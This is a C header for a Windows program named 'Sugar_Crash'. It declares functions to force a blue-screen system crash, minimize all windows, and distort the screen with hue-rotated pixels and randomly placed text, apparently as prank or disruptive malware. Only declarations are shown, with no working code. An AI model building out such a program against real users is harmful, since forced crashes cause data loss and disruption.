#ifndef _SUGAR_CRASH
#define _SUGAR_CRASH

#include <Windows.h>
#include <tchar.h>

#define THREAD  WINAPI
#define FILTER
#define M_PI    3.14159265358f  

/////////////////////////////////////////////////////////////////////////
// main
/////////////////////////////////////////////////////////////////////////

INT Sugar_Crash(VOID);

/////////////////////////////////////////////////////////////////////////
// system
/////////////////////////////////////////////////////////////////////////

VOID Sugar_BlueScreen(NTSTATUS ntErrorStatus);

VOID Sugar_MinimizeAll(VOID);

DWORD Sugar_Random(DWORD dwMin, DWORD dwMax);

/////////////////////////////////////////////////////////////////////////
// screen
/////////////////////////////////////////////////////////////////////////

typedef VOID(FILTER SGRPIXELFILTERPROC)(
    RGBQUAD        *prgbPixels,
    UINT            uWidth,
    UINT            uHeight,
    LPVOID          lpParam);

VOID FILTER HueRotate(
    RGBQUAD        *prgbPixels,
    UINT            uWidth,
    UINT            uHeight,
    LPVOID          lpAngle);

VOID Sugar_ScreenPixelFilter(SGRPIXELFILTERPROC filter, LPVOID lpParam);

VOID Sugar_ScreenDrawText(const PPOINT pPoint, LPCTSTR lpText);

VOID Sugar_ScreenGetRandomPoint(PPOINT pPoint);

DWORD Sugar_ScreenGetFrequency(VOID);

#endif /* _SUGAR_CRASH */